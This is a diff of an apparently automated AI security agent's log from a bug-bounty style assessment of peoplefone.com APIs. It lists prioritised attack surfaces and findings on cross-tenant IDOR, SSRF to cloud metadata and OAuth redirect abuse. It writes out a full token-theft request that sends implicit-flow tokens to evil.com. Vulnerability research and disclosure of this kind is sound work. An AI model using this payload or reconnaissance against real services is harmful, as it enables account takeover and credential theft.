@@ -1,4 +1,4 @@
-## 2026-09-11 19:51:21 UTC [target] (model nemotron3)
+## 2026-09-11 22:22:55 UTC [target] (model nemotron3)
 [PRIO] configuration-api.peoplefone.com/customer/voip/v1,9.2,attack_surface=10,business_value=10,tech_exposure=10,gate_ease=6,cloud_surface=8,freshness=10
 [PRIO] call-api.peoplefone.com/customer/smart-routing/v1,8.4,attack_surface=9,business_value=8,tech_exposure=9,gate_ease=6,cloud_surface=9,freshness=10
 [PRIO] api.peoplefone.com/customer/sms/v1,8.4,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=7,cloud_surface=8,freshness=10
@@ -39,11 +39,11 @@ testability: AUTH_HELPED
 [FINAL] 1. Cross-tenant PBX takeover via Configuration API sequential identifier enumeration (confidence 85)
 [FINAL] 2. OAuth arbitrary redirect_uri / implicit-token theft on auth service (client_id=1) (confidence 78)
 [FINAL] 3. Cloud metadata/IAM keys theft via 5 webhook/callback endpoints with zero host validation (confidence 78)
-[NEXT] HUMAN: Submit the OAuth open-redirect/login-CSRF finding to bugs.olivermaicher.eu now — 37th frozen cycle, triage VALID 7.4 (9.1 conditional). Payload: `GET /oauth/authorize?client_id=1&redirect_uri=https://evil.com/callback&response_type=token&state=csrf&code_challenge=xxx&code_challenge_method=S256` → 302→/de_CH/login preserving attacker redirect_uri; stateless authorize sets `redirect_uri` cookie (httponly, secure, Max-Age 34560000) with attacker value even on 404. Register permanently 500 (all locales) — minting lever closed agent-side; token-acquisition path remains portal-HUMAN-only.
+[NEXT] HUMAN: Submit the OAuth open-redirect/login-CSRF finding to bugs.olivermaicher.eu now — 38th frozen cycle, triage VALID 7.4 (9.1 conditional). Payload: `GET /oauth/authorize?client_id=1&redirect_uri=https://evil.com/callback&response_type=token&state=csrf&code_challenge=xxx&code_challenge_method=S256` → 302→/de_CH/login preserving attacker redirect_uri; stateless authorize sets `redirect_uri` cookie (httponly, secure, Max-Age 34560000) with attacker value even on 404. Register permanently 500 (all locales) — minting lever closed agent-side; token-acquisition path remains portal-HUMAN-only.
 [LEARN] REJECTED MISCONFIG @ *.peoplefone.com: 19 guessed subdomains all NXDOMAIN → NO wildcard DNS; no dangling CNAME targets (all → managed Cloudflare). Corrects filed "wildcard-dominated" claim.
 [LEARN] ACCEPTED AUTH @ auth.peoplefone.com: POST /oauth/token no client_secret → invalid_client JSON for clients 1/4/5 (confidential); nonexistent ids 2,3,10,100,999,0,-1 → unhandled 500. Code-theft-exchange ATO falsified for known clients; ATO escalates only via HUMAN_ONLY implicit-flow test.
-[LEARN] ACCEPTED IDOR @ configuration-api {identifier} CRUD: no counter-evidence; rank holds; token-gated (37th frozen cycle); triage HOLD pending bearer token.
-[LEARN] ACCEPTED SSRF @ 5 callback endpoints: no counter-evidence; retained pending token (37th frozen cycle); triage HOLD.
+[LEARN] ACCEPTED IDOR @ configuration-api {identifier} CRUD: no counter-evidence; rank holds; token-gated (38th frozen cycle); triage HOLD pending bearer token.
+[LEARN] ACCEPTED SSRF @ 5 callback endpoints: no counter-evidence; retained pending token (38th frozen cycle); triage HOLD.
 [LEARN] REJECTED BUSLOGIC @ call-api queue agents: triage-formal INVALID (spec-silent on membership validation); removed from active set.
 [LEARN] ACCEPTED OTH @ auth.peoplefone.com: stateless authorize sets `redirect_uri` cookie (httponly, secure, 1-year expiry) with attacker-controlled value even on 404 response — server processes redirect_uri param partially in stateless mode; behavioral detail supports warm-session 302 reproduction path.
 [LEARN] ACCEPTED OTH @ inventory: call-api.peoplefone.com/services/api-doc/ 404 reconfirmed (2026-09-07); config-api docs 404 reconfirmed; all 8-spec backends match the 401/404-gated real-backend pattern.
